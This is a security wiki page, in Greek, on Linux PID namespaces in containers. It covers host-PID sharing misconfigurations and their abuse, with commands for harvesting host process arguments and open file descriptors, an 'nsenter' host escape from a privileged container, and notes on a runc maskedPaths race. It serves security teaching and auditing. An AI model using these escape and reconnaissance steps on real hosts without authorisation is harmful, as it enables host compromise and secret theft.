# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το PID namespace ελέγχει τον τρόπο αρίθμησης των processes και ποια processes είναι ορατά. Γι' αυτό ένα container μπορεί να έχει το δικό του PID 1, παρόλο που δεν είναι πραγματικό μηχάνημα. Μέσα στο namespace, το workload βλέπει αυτό που φαίνεται σαν ένα τοπικό process tree. Έξω από το namespace, το host εξακολουθεί να βλέπει τα πραγματικά PIDs του host και ολόκληρο το process landscape.

Από άποψη ασφάλειας, το PID namespace έχει σημασία επειδή η ορατότητα των processes είναι πολύτιμη. Μόλις ένα workload μπορεί να δει processes του host, ενδέχεται να μπορεί να παρατηρήσει ονόματα services, ορίσματα γραμμής εντολών, secrets που περνούν ως ορίσματα processes, state που προέρχεται από το environment μέσω του `/proc` και πιθανούς στόχους για namespace entry. Αν μπορεί να κάνει περισσότερα από το να βλέπει απλώς αυτά τα processes, για παράδειγμα να στέλνει signals ή να χρησιμοποιεί ptrace υπό τις κατάλληλες συνθήκες, το πρόβλημα γίνεται πολύ σοβαρότερο.

## Λειτουργία

Ένα νέο PID namespace ξεκινά με τη δική του εσωτερική αρίθμηση processes. Το πρώτο process που δημιουργείται μέσα σε αυτό γίνεται PID 1 από την οπτική γωνία του namespace, γεγονός που σημαίνει επίσης ότι αποκτά ειδική init-like συμπεριφορά για orphaned children και signal behavior. Αυτό εξηγεί πολλές ιδιαιτερότητες των containers σχετικά με τα init processes, το zombie reaping και τον λόγο για τον οποίο μερικές φορές χρησιμοποιούνται μικρά init wrappers στα containers.

Το σημαντικό μάθημα από άποψη ασφάλειας είναι ότι ένα process μπορεί να φαίνεται isolated επειδή βλέπει μόνο το δικό του PID tree, όμως αυτή η isolation μπορεί να αφαιρεθεί σκόπιμα. Το Docker το εκθέτει μέσω του `--pid=host`, ενώ το Kubernetes το κάνει μέσω του `hostPID: true`. Μόλις το container ενταχθεί στο host PID namespace, το workload βλέπει απευθείας τα processes του host και πολλά μεταγενέστερα attack paths γίνονται πολύ πιο ρεαλιστικά.

## Εργαστήριο

Για να δημιουργήσετε χειροκίνητα ένα PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Το shell βλέπει πλέον μια ιδιωτική προβολή διεργασιών. Η σημαία `--mount-proc` είναι σημαντική, επειδή προσαρτά μια παρουσία procfs που αντιστοιχεί στο νέο PID namespace, κάνοντας τη λίστα διεργασιών συνεκτική από το εσωτερικό.

Για να συγκρίνουμε τη συμπεριφορά του container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Η διαφορά είναι άμεση και εύκολη στην κατανόηση, γι' αυτό και αυτό είναι ένα καλό πρώτο lab για τους αναγνώστες.

## Χρήση Runtime

Τα κανονικά containers στα Docker, Podman, containerd και CRI-O αποκτούν το δικό τους PID namespace. Τα Kubernetes Pods συνήθως λαμβάνουν επίσης απομονωμένη οπτική του PID, εκτός αν το workload ζητήσει ρητά κοινή χρήση του host PID. Τα περιβάλλοντα LXC/Incus βασίζονται στην ίδια primitive του kernel, αν και οι περιπτώσεις χρήσης system-container μπορεί να εμφανίζουν πιο περίπλοκα process trees και να ενθαρρύνουν περισσότερα debugging shortcuts.

Ο ίδιος κανόνας ισχύει παντού: αν το runtime επέλεξε να μην απομονώσει το PID namespace, αυτό αποτελεί σκόπιμη μείωση του container boundary.

## Λανθασμένες ρυθμίσεις

Η canonical λανθασμένη ρύθμιση είναι η κοινή χρήση του host PID. Οι ομάδες συχνά τη δικαιολογούν για debugging, monitoring ή για ευκολία στη διαχείριση services, αλλά θα πρέπει πάντα να αντιμετωπίζεται ως σημαντική security exception. Ακόμη και αν το container δεν διαθέτει άμεσο write primitive πάνω σε host processes, η απλή ορατότητα μπορεί να αποκαλύψει πολλά για το σύστημα. Μόλις προστεθούν capabilities όπως το `CAP_SYS_PTRACE` ή χρήσιμη πρόσβαση στο procfs, το risk αυξάνεται σημαντικά.

Ένα ακόμη λάθος είναι η υπόθεση ότι, επειδή το workload δεν μπορεί από προεπιλογή να κάνει kill ή ptrace σε host processes, η κοινή χρήση του host PID είναι επομένως harmless. Αυτό το συμπέρασμα αγνοεί την αξία του enumeration, τη διαθεσιμότητα targets για namespace-entry και τον τρόπο με τον οποίο η ορατότητα των PID συνδυάζεται με άλλους weakened controls.

## Κατάχρηση

Αν το host PID namespace είναι κοινό, ένας attacker μπορεί να επιθεωρήσει host processes, να συλλέξει process arguments, να εντοπίσει ενδιαφέροντα services, να βρει υποψήφια PIDs για `nsenter` ή να συνδυάσει την ορατότητα των processes με privilege σχετικό με ptrace, ώστε να παρέμβει σε host ή neighboring workloads. Σε ορισμένες περιπτώσεις, ακόμη και το να δει απλώς το σωστό long-running process αρκεί για να αναδιαμορφώσει το υπόλοιπο attack plan.

Το πρώτο πρακτικό βήμα είναι πάντα να επιβεβαιωθεί ότι τα host processes είναι πράγματι ορατά:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Μόλις τα PID του host είναι ορατά, τα ορίσματα των διεργασιών και οι στόχοι εισόδου στα namespace συχνά αποτελούν την πιο χρήσιμη πηγή πληροφοριών:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Εάν το `nsenter` είναι διαθέσιμο και υπάρχει επαρκές επίπεδο προνομίων, ελέγξτε αν μια ορατή διεργασία του host μπορεί να χρησιμοποιηθεί ως γέφυρα namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Ακόμη και όταν η είσοδος είναι αποκλεισμένη, η κοινή χρήση των host PID παραμένει χρήσιμη, επειδή αποκαλύπτει τη διάταξη των υπηρεσιών, τα runtime components και πιθανές privileged διεργασίες που μπορούν να αποτελέσουν τον επόμενο στόχο.

Η ορατότητα των host PID κάνει επίσης πιο ρεαλιστική την κατάχρηση file descriptors. Αν μια privileged διεργασία του host ή ένα neighboring workload έχει ανοικτό ένα ευαίσθητο αρχείο ή socket, ο attacker ενδέχεται να μπορεί να επιθεωρήσει το `/proc/<pid>/fd/` και να επαναχρησιμοποιήσει αυτό το handle, ανάλογα με την ιδιοκτησία, τις επιλογές προσάρτησης του procfs και το μοντέλο της υπηρεσίας-στόχου.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν στο αν το `hidepid=1` ή το `hidepid=2` μειώνει την ορατότητα μεταξύ processes και αν είναι ορατοί εξαρχής προφανώς ενδιαφέροντες descriptors, όπως ανοιχτά secret files, logs ή Unix sockets.

### Πλήρες Παράδειγμα: host PID + `nsenter`

Η κοινή χρήση host PID γίνεται direct host escape όταν το process έχει επίσης αρκετά privileges για να γίνει join στα host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Εάν η εντολή ολοκληρωθεί με επιτυχία, η διεργασία του container εκτελείται πλέον στα mount, UTS, network, IPC και PID namespaces του host. Ο αντίκτυπος είναι άμεσος compromise του host.

Ακόμη και όταν το `nsenter` απουσιάζει, το ίδιο αποτέλεσμα μπορεί να επιτευχθεί μέσω του binary του host, εάν έχει γίνει mount το filesystem του host:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Πρόσφατες σημειώσεις Runtime

Ορισμένες επιθέσεις που σχετίζονται με τα PID namespaces δεν αφορούν παραδοσιακές παραμετροποιήσεις `hostPID: true`, αλλά σφάλματα υλοποίησης του Runtime σχετικά με τον τρόπο εφαρμογής των προστασιών του procfs κατά τη ρύθμιση του container.

#### Race των `maskedPaths` προς το host procfs

Σε ευάλωτες εκδόσεις του `runc`, attackers που μπορούν να ελέγξουν το container image ή το workload του `runc exec` μπορούν να κάνουν race στη φάση masking, αντικαθιστώντας το `/dev/null` στην πλευρά του container με ένα symlink προς μια ευαίσθητη διαδρομή procfs, όπως το `/proc/sys/kernel/core_pattern`. Αν το race πετύχει, το bind mount του masked path μπορεί να τοποθετηθεί στον λάθος στόχο και να εκθέσει host-global procfs knobs στο νέο container.<sup>[[1]](#references)</sup>

Χρήσιμη εντολή ελέγχου:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Αυτό είναι σημαντικό, επειδή ο τελικός αντίκτυπος μπορεί να είναι ίδιος με μια άμεση έκθεση του procfs: εγγράψιμα `core_pattern` ή `sysrq-trigger`, ακολουθούμενα από εκτέλεση κώδικα στο host ή denial of service.

#### Έγχυση Namespace με `insject`

Εργαλεία έγχυσης Namespace, όπως το `insject`, δείχνουν ότι η αλληλεπίδραση με ένα PID namespace δεν απαιτεί πάντα την εκ των προτέρων είσοδο στο namespace-στόχο πριν από τη δημιουργία της διεργασίας. Ένα βοηθητικό πρόγραμμα μπορεί να συνδεθεί αργότερα, να χρησιμοποιήσει `setns()` και να εκτελεστεί, διατηρώντας την ορατότητα στον χώρο PID-στόχο:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Αυτό το είδος τεχνικής είναι σημαντικό κυρίως για advanced debugging, offensive tooling και post-exploitation workflows, όπου το namespace context πρέπει να συνδεθεί αφού το runtime έχει ήδη αρχικοποιήσει το workload.

### Related FD Abuse Patterns

Αξίζει να επισημανθούν ρητά δύο patterns όταν τα host PIDs είναι ορατά. Πρώτον, μια privileged process μπορεί να διατηρεί ένα sensitive file descriptor ανοιχτό κατά τη διάρκεια του `execve()`, επειδή δεν είχε επισημανθεί με `O_CLOEXEC`. Δεύτερον, οι services μπορούν να μεταβιβάζουν file descriptors μέσω Unix sockets χρησιμοποιώντας το `SCM_RIGHTS`. Και στις δύο περιπτώσεις, το ενδιαφέρον αντικείμενο δεν είναι πλέον το pathname, αλλά το ήδη ανοιχτό handle που μια lower-privilege process μπορεί να κληρονομήσει ή να λάβει.

Αυτό είναι σημαντικό στο container work, επειδή το handle μπορεί να δείχνει στο `docker.sock`, σε ένα privileged log, σε ένα host secret file ή σε κάποιο άλλο high-value object, ακόμη και όταν το ίδιο το path δεν είναι άμεσα προσβάσιμο από το container filesystem.

## Checks

Ο σκοπός αυτών των commands είναι να καθοριστεί αν η process έχει private PID view ή αν μπορεί ήδη να απαριθμήσει ένα πολύ ευρύτερο process landscape.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν η λίστα διεργασιών περιέχει εμφανείς υπηρεσίες του host, πιθανότατα ο διαμοιρασμός των PID του host είναι ήδη ενεργός.
- Η εμφάνιση μόνο ενός μικρού, τοπικού στο container δέντρου διεργασιών αποτελεί τη συνήθη βασική κατάσταση· η εμφάνιση των `systemd`, `dockerd` ή άσχετων daemons δεν είναι.
- Μόλις γίνουν ορατά τα PID του host, ακόμη και οι πληροφορίες διεργασιών μόνο για ανάγνωση γίνονται χρήσιμες για reconnaissance.

Αν ανακαλύψετε ένα container που εκτελείται με ενεργό διαμοιρασμό των PID του host, μην το αντιμετωπίσετε ως απλή αισθητική διαφορά. Πρόκειται για σημαντική αλλαγή στο τι μπορεί να παρατηρεί και δυνητικά να επηρεάζει το workload.

## References

- [1] [runc security advisory: container escape via "masked path" abuse due to mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: A Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
